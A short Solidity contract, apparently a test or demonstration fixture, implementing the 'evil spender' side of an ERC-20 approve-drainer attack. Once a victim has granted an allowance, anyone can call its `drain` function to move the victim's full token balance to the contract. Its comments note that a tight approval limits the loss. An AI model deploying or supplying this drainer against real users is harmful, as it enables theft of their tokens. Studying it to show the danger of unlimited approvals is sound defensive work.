// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

/// @title MaliciousSpender - the "evil spender" end of the approve-drainer vector.
/// @notice Once a victim has approved this contract on some ERC-20, anyone can call
///         `drain` to pull the victim's ENTIRE balance in a single transferFrom.
///         How much it can take is bounded only by the allowance the victim granted:
///         an unlimited approve lets it take everything, a tight approve stops it.
contract MaliciousSpender {
    event Drained(address indexed token, address indexed victim, uint256 amount);

    /// @notice Attempts to pull the victim's full token balance to `address(this)`.
    ///         Reverts if the granted allowance is smaller than that balance.
    function drain(address token, address victim) external returns (uint256 amount) {
        amount = IERC20(token).balanceOf(victim);
        IERC20(token).transferFrom(victim, address(this), amount);
        emit Drained(token, victim, amount);
    }
}
